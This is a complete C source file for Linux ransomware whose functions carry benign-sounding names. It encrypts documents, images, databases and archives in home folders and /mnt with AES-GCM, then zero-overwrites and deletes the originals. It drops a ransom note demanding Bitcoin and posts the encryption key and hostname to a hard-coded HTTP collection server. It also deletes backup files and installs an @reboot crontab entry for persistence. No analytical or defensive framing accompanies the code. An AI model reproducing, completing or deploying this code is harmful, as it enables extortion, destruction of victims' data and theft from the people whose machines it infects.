/* === Merged main.c === */

#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <ftw.h>
#include <limits.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

/* libcurl */
#include <curl/curl.h>

/* ---- base64 (self-contained implementations) ---- */

static const unsigned char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *base64_encode(const unsigned char *data, size_t input_length) {
    size_t output_length = 4 * ((input_length + 2) / 3);
    char *encoded = malloc(output_length + 1);
    if (!encoded) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded[j++] = base64_chars[(triple >> 3 * 6) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 2 * 6) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 1 * 6) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 0 * 6) & 0x3F];
    }

    /* Add padding */
    size_t pad = (3 - input_length % 3) % 3;
    for (size_t k = 0; k < pad; k++)
        encoded[output_length - 1 - k] = '=';

    encoded[output_length] = '\0';
    return encoded;
}

unsigned char *base64_decode(const char *data, size_t *output_length) {
    size_t input_length = strlen(data);
    if (input_length % 4 != 0) return NULL;

    size_t padding = 0;
    if (input_length > 0 && data[input_length - 1] == '=') padding++;
    if (input_length > 1 && data[input_length - 2] == '=') padding++;

    *output_length = input_length / 4 * 3 - padding;
    unsigned char *decoded = malloc(*output_length + 1);
    if (!decoded) return NULL;

    size_t i, j;
    uint32_t sextet[4];
    for (i = 0, j = 0; i < input_length; i += 4) {
        for (int k = 0; k < 4; k++) {
            if (data[i + k] == '=') {
                sextet[k] = 0;
            } else {
                const char *p = strchr((const char *)base64_chars, data[i + k]);
                if (!p) {
                    free(decoded);
                    return NULL;
                }
                sextet[k] = p - (const char *)base64_chars;
            }
        }
        uint32_t triple = (sextet[0] << 18) + (sextet[1] << 12) + (sextet[2] << 6) + sextet[3];
        if (j < *output_length) decoded[j++] = (triple >> 16) & 0xFF;
        if (j < *output_length) decoded[j++] = (triple >> 8) & 0xFF;
        if (j < *output_length) decoded[j++] = triple & 0xFF;
    }
    decoded[*output_length] = '\0';
    return decoded;
}

/* ---- Module 1: init_session ---- */

static const char ENDPOINT_B64[] = "aHR0cDovLzE5Mi4xNjguMTUuMTI6ODA4MC9jb2xsZWN0";
static const char BITCOIN_B64[]  = "MUExelAxZVA1UUdlZmkyRE1QVGZUTDVTTG12N0RpdmZOYT09";

static char *endpoint_url     = NULL;
static char *bitcoin_address  = NULL;

/* Global AES key (raw 32 bytes) – set by init_session */
unsigned char g_aes_key[32];
int g_key_initialized = 0;

int init_session(void)
{
    unsigned char aes_key[32];
    char *b64_key = NULL;
    FILE *fp = NULL;
    unsigned char *decoded = NULL;
    size_t decoded_len = 0;

    if (RAND_bytes(aes_key, sizeof(aes_key)) != 1) {
        fprintf(stderr, "ERROR: RAND_bytes failed to generate AES key\n");
        return -1;
    }

    /* Store raw key globally */
    memcpy(g_aes_key, aes_key, 32);
    g_key_initialized = 1;

    b64_key = base64_encode(aes_key, sizeof(aes_key));
    if (!b64_key) {
        fprintf(stderr, "ERROR: base64_encode failed for AES key\n");
        return -1;
    }

    fp = fopen("/tmp/.master.key", "w");
    if (!fp) {
        perror("ERROR: fopen /tmp/.master.key");
        free(b64_key);
        return -1;
    }

    if (fchmod(fileno(fp), 0600) == -1) {
        perror("ERROR: fchmod /tmp/.master.key");
        fclose(fp);
        free(b64_key);
        return -1;
    }

    if (fprintf(fp, "{\"aes_key\":\"%s\"}\n", b64_key) < 0) {
        perror("ERROR: fprintf to /tmp/.master.key");
        fclose(fp);
        free(b64_key);
        return -1;
    }

    fclose(fp);
    free(b64_key);

    decoded = base64_decode(ENDPOINT_B64, &decoded_len);
    if (!decoded) {
        fprintf(stderr, "ERROR: base64_decode failed for endpoint URL\n");
        return -1;
    }

    endpoint_url = malloc(decoded_len + 1);
    if (!endpoint_url) {
        perror("ERROR: malloc for endpoint_url");
        free(decoded);
        return -1;
    }
    memcpy(endpoint_url, decoded, decoded_len);
    endpoint_url[decoded_len] = '\0';
    free(decoded);

    decoded = base64_decode(BITCOIN_B64, &decoded_len);
    if (!decoded) {
        fprintf(stderr, "ERROR: base64_decode failed for Bitcoin address\n");
        free(endpoint_url);
        endpoint_url = NULL;
        return -1;
    }

    bitcoin_address = malloc(decoded_len + 1);
    if (!bitcoin_address) {
        perror("ERROR: malloc for bitcoin_address");
        free(decoded);
        free(endpoint_url);
        endpoint_url = NULL;
        return -1;
    }
    memcpy(bitcoin_address, decoded, decoded_len);
    bitcoin_address[decoded_len] = '\0';
    free(decoded);

    return 0;
}

/* ---- Module 2: scan_storage ---- */

#define MAX_DEPTH 50
#define INITIAL_LIST_CAPACITY 1024

static bool has_valid_extension(const char *filename) {
    const char *extensions[] = {
        ".xlsx", ".docx", ".pdf", ".txt", ".csv",
        ".jpg", ".png", ".db", ".backup", ".psd",
        ".zip", ".rar", NULL
    };

    const char *dot = strrchr(filename, '.');
    if (!dot || dot == filename) return false;

    for (int i = 0; extensions[i] != NULL; i++) {
        if (strcasecmp(dot, extensions[i]) == 0) {
            return true;
        }
    }
    return false;
}

static int append_to_list(char ***list, size_t *size, size_t *capacity, const char *path) {
    if (*size >= *capacity - 1) {
        size_t new_capacity = *capacity * 2;
        char **new_list = realloc(*list, new_capacity * sizeof(char *));
        if (!new_list) return -1;
        *list = new_list;
        *capacity = new_capacity;
    }

    (*list)[*size] = strdup(path);
    if (!(*list)[*size]) return -1;
    (*size)++;
    (*list)[*size] = NULL;
    return 0;
}

static int scan_directory(const char *base_path, char ***list,
                          size_t *list_size, size_t *list_capacity, int depth) {
    if (depth > MAX_DEPTH) {
        fprintf(stderr, "Warning: Maximum depth (%d) reached at %s, skipping deeper\n",
                MAX_DEPTH, base_path);
        return 0;
    }

    DIR *dir = opendir(base_path);
    if (!dir) {
        fprintf(stderr, "Warning: Cannot open directory %s: %s\n",
                base_path, strerror(errno));
        return 0;
    }

    struct dirent *entry;
    char full_path[PATH_MAX];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        int written = snprintf(full_path, sizeof(full_path), "%s/%s",
                               base_path, entry->d_name);
        if (written < 0 || (size_t)written >= sizeof(full_path)) {
            fprintf(stderr, "Warning: Path too long: %s/%s\n", base_path, entry->d_name);
            continue;
        }

        struct stat statbuf;
        if (lstat(full_path, &statbuf) == -1) {
            fprintf(stderr, "Warning: Cannot stat %s: %s\n", full_path, strerror(errno));
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            if (scan_directory(full_path, list, list_size, list_capacity, depth + 1) != 0) {
                fprintf(stderr, "Warning: Error scanning subdirectory %s\n", full_path);
            }
        } else if (S_ISREG(statbuf.st_mode)) {
            if (has_valid_extension(entry->d_name)) {
                if (append_to_list(list, list_size, list_capacity, full_path) != 0) {
                    fprintf(stderr, "Error: Memory allocation failed for path %s\n", full_path);
                    closedir(dir);
                    return -1;
                }
            }
        }
    }

    closedir(dir);
    return 0;
}

char **scan_storage(void) {
    const char *base_dirs[] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens",
        NULL
    };

    char **list = NULL;
    size_t list_size = 0;
    size_t list_capacity = INITIAL_LIST_CAPACITY;

    list = malloc(list_capacity * sizeof(char *));
    if (!list) {
        fprintf(stderr, "Error: Memory allocation failed\n");
        return NULL;
    }
    list[0] = NULL;

    const char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "Error: HOME environment variable not set\n");
        free(list);
        return NULL;
    }

    for (int i = 0; base_dirs[i] != NULL; i++) {
        char dir_path[PATH_MAX];
        int written = snprintf(dir_path, sizeof(dir_path), "%s/%s", home, base_dirs[i]);
        if (written < 0 || (size_t)written >= sizeof(dir_path)) {
            fprintf(stderr, "Warning: Path too long: %s/%s\n", home, base_dirs[i]);
            continue;
        }

        struct stat st;
        if (stat(dir_path, &st) == -1) {
            fprintf(stderr, "Warning: Directory %s does not exist, skipping\n", dir_path);
            continue;
        }

        if (!S_ISDIR(st.st_mode)) {
            fprintf(stderr, "Warning: %s is not a directory, skipping\n", dir_path);
            continue;
        }

        if (scan_directory(dir_path, &list, &list_size, &list_capacity, 0) != 0) {
            fprintf(stderr, "Warning: Error scanning directory %s\n", dir_path);
        }
    }

    struct stat mnt_stat;
    if (stat("/mnt", &mnt_stat) == 0 && S_ISDIR(mnt_stat.st_mode)) {
        if (scan_directory("/mnt", &list, &list_size, &list_capacity, 0) != 0) {
            fprintf(stderr, "Warning: Error scanning /mnt directory\n");
        }
    } else {
        fprintf(stderr, "Warning: /mnt directory not found or inaccessible, skipping\n");
    }

    if (list_size > 0) {
        char **shrunken_list = realloc(list, (list_size + 1) * sizeof(char *));
        if (shrunken_list) list = shrunken_list;
    }

    list[list_size] = NULL;
    return list;
}

void free_scan_list(char **list) {
    if (!list) return;
    for (int i = 0; list[i] != NULL; i++) {
        free(list[i]);
    }
    free(list);
}

/* ---- Module 3: apply_transform ---- */

int apply_transform(const char **file_paths, int num_files, const uint8_t *session_key)
{
    if (num_files <= 0) return 0;
    if (file_paths == NULL || session_key == NULL) return -1;

    int processed = 0;

    for (int i = 0; i < num_files; i++) {
        const char *path = file_paths[i];
        if (path == NULL) {
            fprintf(stderr, "apply_transform: null file path at index %d\n", i);
            continue;
        }

        FILE *in = NULL, *out = NULL;
        unsigned char *plain = NULL, *cipher = NULL;
        EVP_CIPHER_CTX *ctx = NULL;
        char *out_path = NULL;
        unsigned char nonce[12], tag[16];
        long file_size = 0;
        size_t cipher_len = 0, total_read = 0, total_zero_written = 0;
        int final_len = 0, error = 0, out_created = 0, out_complete = 0;

        if (RAND_bytes(nonce, (int)sizeof(nonce)) != 1) {
            fprintf(stderr, "apply_transform: RAND_bytes failed\n");
            return -1;
        }

        in = fopen(path, "r+b");
        if (in == NULL) {
            fprintf(stderr, "apply_transform: %s: fopen failed: %s\n", path, strerror(errno));
            continue;
        }

        if (fseek(in, 0, SEEK_END) != 0) {
            fprintf(stderr, "apply_transform: %s: fseek end failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        file_size = ftell(in);
        if (file_size < 0) {
            fprintf(stderr, "apply_transform: %s: ftell failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        if (fseek(in, 0, SEEK_SET) != 0) {
            fprintf(stderr, "apply_transform: %s: fseek start failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        plain = malloc(file_size == 0 ? 1 : (size_t)file_size);
        if (plain == NULL) {
            fprintf(stderr, "apply_transform: %s: malloc plaintext failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        total_read = 0;
        while (total_read < (size_t)file_size) {
            size_t n = fread(plain + total_read, 1, (size_t)file_size - total_read, in);
            if (n == 0) {
                if (ferror(in))
                    fprintf(stderr, "apply_transform: %s: fread failed: %s\n", path, strerror(errno));
                else
                    fprintf(stderr, "apply_transform: %s: fread failed: unexpected end of file\n", path);
                error = 1; goto cleanup;
            }
            total_read += n;
        }

        size_t path_len = strlen(path);
        out_path = malloc(path_len + sizeof(".PROCESSED"));
        if (out_path == NULL) {
            fprintf(stderr, "apply_transform: %s: malloc output path failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        memcpy(out_path, path, path_len);
        memcpy(out_path + path_len, ".PROCESSED", sizeof(".PROCESSED"));

        out = fopen(out_path, "wb");
        if (out == NULL) {
            fprintf(stderr, "apply_transform: %s: fopen output failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }
        out_created = 1;

        cipher = malloc((size_t)file_size + EVP_MAX_BLOCK_LENGTH);
        if (cipher == NULL) {
            fprintf(stderr, "apply_transform: %s: malloc ciphertext failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        ctx = EVP_CIPHER_CTX_new();
        if (ctx == NULL) {
            fprintf(stderr, "apply_transform: %s: EVP_CIPHER_CTX_new failed\n", path);
            error = 1; goto cleanup;
        }

        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
            fprintf(stderr, "apply_transform: %s: EVP_EncryptInit_ex failed\n", path);
            error = 1; goto cleanup;
        }

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) {
            fprintf(stderr, "apply_transform: %s: EVP_CTRL_GCM_SET_IVLEN failed\n", path);
            error = 1; goto cleanup;
        }

        if (EVP_EncryptInit_ex(ctx, NULL, NULL, (const unsigned char *)session_key, nonce) != 1) {
            fprintf(stderr, "apply_transform: %s: EVP_EncryptInit_ex with key failed\n", path);
            error = 1; goto cleanup;
        }

        cipher_len = 0;
        size_t in_off = 0;
        while (in_off < (size_t)file_size) {
            size_t chunk = (size_t)file_size - in_off;
            if (chunk > INT_MAX) chunk = INT_MAX;
            int outl = 0;
            if (EVP_EncryptUpdate(ctx, cipher + cipher_len, &outl, plain + in_off, (int)chunk) != 1) {
                fprintf(stderr, "apply_transform: %s: EVP_EncryptUpdate failed\n", path);
                error = 1; goto cleanup;
            }
            cipher_len += (size_t)outl;
            in_off += chunk;
        }

        final_len = 0;
        if (EVP_EncryptFinal_ex(ctx, cipher + cipher_len, &final_len) != 1) {
            fprintf(stderr, "apply_transform: %s: EVP_EncryptFinal_ex failed\n", path);
            error = 1; goto cleanup;
        }
        cipher_len += (size_t)final_len;

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, (int)sizeof(tag), tag) != 1) {
            fprintf(stderr, "apply_transform: %s: EVP_CTRL_GCM_GET_TAG failed\n", path);
            error = 1; goto cleanup;
        }

        if (fwrite(nonce, 1, sizeof(nonce), out) != sizeof(nonce) ||
            fwrite(cipher, 1, cipher_len, out) != cipher_len ||
            fwrite(tag, 1, sizeof(tag), out) != sizeof(tag)) {
            fprintf(stderr, "apply_transform: %s: write failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        if (fflush(out) != 0) {
            fprintf(stderr, "apply_transform: %s: fflush output failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        if (fclose(out) != 0) {
            fprintf(stderr, "apply_transform: %s: fclose output failed: %s\n", path, strerror(errno));
            out = NULL; error = 1; goto cleanup;
        }
        out = NULL;
        out_complete = 1;

        if (fseek(in, 0, SEEK_SET) != 0) {
            fprintf(stderr, "apply_transform: %s: rewind for overwrite failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        if (file_size > 0) {
            memset(plain, 0, (size_t)file_size);
            total_zero_written = 0;
            while (total_zero_written < (size_t)file_size) {
                size_t n = fwrite(plain, 1, (size_t)file_size - total_zero_written, in);
                if (n == 0) {
                    fprintf(stderr, "apply_transform: %s: overwrite failed: %s\n", path, strerror(errno));
                    error = 1; goto cleanup;
                }
                total_zero_written += n;
            }
        }

        if (fflush(in) != 0) {
            fprintf(stderr, "apply_transform: %s: fflush source failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        if (fclose(in) != 0) {
            fprintf(stderr, "apply_transform: %s: fclose source failed: %s\n", path, strerror(errno));
            in = NULL; error = 1; goto cleanup;
        }
        in = NULL;

        if (remove(path) != 0) {
            fprintf(stderr, "apply_transform: %s: remove failed: %s\n", path, strerror(errno));
            error = 1; goto cleanup;
        }

        processed++;

cleanup:
        if (in != NULL) fclose(in);
        if (out != NULL) fclose(out);
        if (plain != NULL) {
            OPENSSL_cleanse(plain, file_size == 0 ? 0 : (size_t)file_size);
            free(plain);
        }
        if (cipher != NULL) {
            OPENSSL_cleanse(cipher, (size_t)file_size + EVP_MAX_BLOCK_LENGTH);
            free(cipher);
        }
        if (ctx != NULL) EVP_CIPHER_CTX_free(ctx);
        if (out_path != NULL) {
            if (error && out_created && !out_complete) remove(out_path);
            free(out_path);
        }
    }

    return processed;
}

/* ---- Module 4: write_notice ---- */

int write_notice(const char *dir_path) {
    const char *filename = "#_STATUS_NOTICE_#.txt";
    size_t needed = snprintf(NULL, 0, "%s/%s", dir_path, filename) + 1;
    char *full_path = malloc(needed);
    if (!full_path) {
        perror("malloc");
        return -1;
    }
    snprintf(full_path, needed, "%s/%s", dir_path, filename);

    FILE *fp = fopen(full_path, "w");
    if (!fp) {
        perror("fopen");
        free(full_path);
        return -1;
    }

    const char *content =
        "Request 300 USD in payment service to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa "
        "and instruct contact via secure channel.";
    if (fputs(content, fp) == EOF) {
        perror("fputs");
        fclose(fp);
        free(full_path);
        return -1;
    }

    if (fclose(fp) == EOF) {
        perror("fclose");
        free(full_path);
        return -1;
    }

    free(full_path);
    return 0;
}

/* ---- Module 5: sync_telemetry ---- */

static size_t discard_response(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    (void)ptr;
    (void)userdata;
    return size * nmemb;
}

int sync_telemetry(void)
{
    FILE *fp = NULL;
    long file_size;
    char *file_content = NULL;
    char *aes_key = NULL;
    char hostname[256] = {0};
    char *json_body = NULL;
    CURL *curl = NULL;
    struct curl_slist *headers = NULL;
    CURLcode res;
    long http_code = 0;
    int ret = -1;

    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        perror("fopen /tmp/.master.key");
        goto cleanup;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek");
        goto cleanup;
    }
    file_size = ftell(fp);
    if (file_size < 0) {
        perror("ftell");
        goto cleanup;
    }
    rewind(fp);

    file_content = (char *)malloc(file_size + 1);
    if (!file_content) {
        perror("malloc");
        goto cleanup;
    }
    if (fread(file_content, 1, file_size, fp) != (size_t)file_size) {
        perror("fread");
        goto cleanup;
    }
    file_content[file_size] = '\0';
    fclose(fp);
    fp = NULL;

    const char *key_pattern = "\"aes_key\":\"";
    char *start = strstr(file_content, key_pattern);
    if (!start) {
        fprintf(stderr, "error: 'aes_key' field not found in file\n");
        goto cleanup;
    }
    start += strlen(key_pattern);

    char *end = strchr(start, '"');
    if (!end) {
        fprintf(stderr, "error: malformed aes_key value\n");
        goto cleanup;
    }
    size_t key_len = end - start;
    aes_key = strndup(start, key_len);
    if (!aes_key) {
        perror("strndup");
        goto cleanup;
    }

    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        goto cleanup;
    }
    hostname[sizeof(hostname) - 1] = '\0';

    int json_len = snprintf(NULL, 0,
                            "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
                            aes_key, hostname);
    if (json_len < 0) {
        perror("snprintf calc");
        goto cleanup;
    }
    json_body = (char *)malloc(json_len + 1);
    if (!json_body) {
        perror("malloc json_body");
        goto cleanup;
    }
    snprintf(json_body, json_len + 1,
             "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
             aes_key, hostname);

    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "error: curl_easy_init failed\n");
        goto cleanup;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.15.12:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_body));

    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_response);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        goto cleanup;
    }

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("remove /tmp/.master.key");
        }
        ret = 0;
    } else {
        fprintf(stderr, "Server returned HTTP %ld\n", http_code);
        ret = -1;
    }

cleanup:
    if (fp) fclose(fp);
    free(file_content);
    free(aes_key);
    free(json_body);
    if (headers) curl_slist_free_all(headers);
    if (curl) curl_easy_cleanup(curl);
    return ret;
}

/* ---- Module 6: schedule_and_purge (renamed to register_service) ---- */

static const char *purge_dirs[] = {
    "/var/tmp",
    "/home/user/backups",
    NULL
};

static int purge_callback(const char *fpath,
                          const struct stat *sb,
                          int typeflag,
                          struct FTW *ftwbuf) {
    (void)sb;
    (void)ftwbuf;

    if (typeflag == FTW_F) {
        const char *ext = strrchr(fpath, '.');
        if (ext &&
            (strcmp(ext, ".bak") == 0 ||
             strcmp(ext, ".backup") == 0 ||
             strcmp(ext, ".old") == 0)) {
            if (remove(fpath) != 0) {
                fprintf(stderr, "Failed to remove %s: %s\n",
                        fpath, strerror(errno));
            }
        }
    }
    return 0;
}

int register_service(const char *binary_path) {
    FILE *fp = popen("crontab -l", "r");
    if (fp == NULL) {
        perror("popen crontab -l");
        return -1;
    }

    char *line = NULL;
    size_t len = 0;
    ssize_t nread;
    char **lines = NULL;
    size_t line_count = 0;
    int reboot_found = 0;

    while ((nread = getline(&line, &len, fp)) != -1) {
        if (nread > 0 && line[nread - 1] == '\n')
            line[nread - 1] = '\0';

        if (strncmp(line, "@reboot ", 8) == 0) {
            if (strcmp(line + 8, binary_path) == 0)
                reboot_found = 1;
        }

        char *dup = strdup(line);
        if (dup == NULL) {
            perror("strdup");
            free(line);
            pclose(fp);
            for (size_t i = 0; i < line_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }

        char **tmp = realloc(lines, sizeof(char *) * (line_count + 1));
        if (tmp == NULL) {
            perror("realloc");
            free(dup);
            free(line);
            pclose(fp);
            for (size_t i = 0; i < line_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }
        lines = tmp;
        lines[line_count++] = dup;
    }

    free(line);

    int ret = pclose(fp);
    if (ret == -1) {
        perror("pclose crontab -l");
    } else if (ret != 0 && WEXITSTATUS(ret) != 1) {
        fprintf(stderr, "crontab -l exited with code %d\n", WEXITSTATUS(ret));
    }

    if (!reboot_found) {
        fp = popen("crontab -", "w");
        if (fp == NULL) {
            perror("popen crontab -");
            for (size_t i = 0; i < line_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }

        for (size_t i = 0; i < line_count; i++) {
            if (fprintf(fp, "%s\n", lines[i]) < 0) {
                perror("fprintf to crontab");
                pclose(fp);
                for (size_t i = 0; i < line_count; i++) free(lines[i]);
                free(lines);
                return -1;
            }
        }
        if (fprintf(fp, "@reboot %s\n", binary_path) < 0) {
            perror("fprintf new crontab entry");
            pclose(fp);
            for (size_t i = 0; i < line_count; i++) free(lines[i]);
            free(lines);
            return -1;
        }

        ret = pclose(fp);
        if (ret == -1) {
            perror("pclose crontab -");
            for (size_t i = 0; i < line_count; i++) free(lines[i]);
            free(lines);
            return -1;
        } else if (ret != 0) {
            fprintf(stderr, "crontab - exited with code %d\n", WEXITSTATUS(ret));
        }
    }

    for (size_t i = 0; i < line_count; i++) free(lines[i]);
    free(lines);

    for (size_t i = 0; purge_dirs[i] != NULL; i++) {
        if (nftw(purge_dirs[i], purge_callback, 20, FTW_PHYS) != 0) {
            fprintf(stderr, "Error scanning directory %s: %s\n",
                    purge_dirs[i], strerror(errno));
        }
    }

    return 0;
}

/* ---- main() ---- */

int main(int argc, char *argv[]) {
    (void)argc; /* unused */

    /* 1. Key generation */
    if (init_session() != 0) {
        fprintf(stderr, "Fatal: init_session failed\n");
        return 1;
    }
    if (!g_key_initialized) {
        fprintf(stderr, "Fatal: AES key not initialized\n");
        return 1;
    }

    /* 2. File scan */
    char **target_files = scan_storage();
    if (!target_files) {
        fprintf(stderr, "Fatal: scan_storage returned NULL\n");
        return 1;
    }

    /* Count files */
    size_t file_count = 0;
    while (target_files[file_count] != NULL) file_count++;

    /* 3. Encryption */
    int encrypted = apply_transform((const char **)target_files, (int)file_count, g_aes_key);
    if (encrypted < 0) {
        fprintf(stderr, "Error during encryption\n");
    }

    /* 4. Ransom notes – collect unique directories from encrypted files */
    /* We'll build a simple array of unique dirs (max files) */
    char **unique_dirs = malloc(sizeof(char *) * (file_count + 1));
    if (!unique_dirs) {
        perror("malloc unique_dirs");
        free_scan_list(target_files);
        return 1;
    }
    size_t dir_count = 0;
    for (size_t i = 0; i < file_count; i++) {
        /* Extract directory part using strrchr */
        char *slash = strrchr(target_files[i], '/');
        if (!slash) continue; /* should not happen for absolute paths */
        size_t dir_len = slash - target_files[i];
        char *dir = strndup(target_files[i], dir_len);
        if (!dir) {
            perror("strndup dir");
            continue;
        }
        /* Check if already in list */
        int found = 0;
        for (size_t j = 0; j < dir_count; j++) {
            if (strcmp(unique_dirs[j], dir) == 0) {
                found = 1;
                break;
            }
        }
        if (!found) {
            unique_dirs[dir_count++] = dir;
        } else {
            free(dir);
        }
    }
    unique_dirs[dir_count] = NULL;

    for (size_t i = 0; i < dir_count; i++) {
        write_notice(unique_dirs[i]);
        free(unique_dirs[i]);
    }
    free(unique_dirs);

    /* 5. Exfiltration */
    sync_telemetry();

    /* 6. Persistence */
    register_service(argv[0]);

    /* Cleanup */
    free_scan_list(target_files);
    return 0;
}